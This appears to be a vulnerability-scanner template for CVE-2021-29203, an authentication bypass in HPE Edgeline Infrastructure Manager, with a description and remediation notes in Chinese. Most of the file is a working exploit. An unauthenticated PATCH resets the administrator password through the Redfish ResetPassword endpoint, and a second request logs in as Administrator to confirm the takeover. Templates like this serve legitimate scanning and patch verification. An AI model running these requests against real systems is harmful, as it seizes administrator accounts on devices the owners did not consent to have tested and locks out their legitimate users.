id: CVE-2021-29203
info:
  name: HPE Edgeline Infrastructure Manager <1.22 - Authentication Bypass
  author:
  - l0ne1y
  description: |-
    HPE Edgeline Infrastructure Management 认证绕过漏洞
    HPE Edgeline Infrastructure Management是美国惠普（HPE）公司的一个用于数据中心环境用于管理Edge设备的软件。

    Edgeline Infrastructure Manager 认证绕过漏洞，该漏洞源于没有充分的授权检查。以下产品及版本受到影响：Edgeline Infrastructure Manager： 1.21 。
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://support.hpe.com/hpesc/public/docDisplay?docLocale=en_US&docId=hpesbgn04124en_us

    临时修复方案：
    1、前后端同时对用户输入信息进行校验，双重验证机制。
    2、调用功能前验证用户是否有权限调用相关功能。
requests:
- matchers:
  - type: status
    status:
    - 201
  - type: word
    condition: and
    part: header
    words:
    - X-Auth-Token
    - PasswordReset
    - Location
  - type: word
    part: body
    words:
    - Base.1.0.Created
  matchers-condition: and
  raw:
  - |
    PATCH /redfish/v1/SessionService/ResetPassword/1/ HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Content-Type: application/json

    {"Password":"{{randstr}}"}
  - |
    POST /redfish/v1/SessionService/Sessions/ HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json

    {"UserName":"Administrator","Password":"{{randstr}}"}
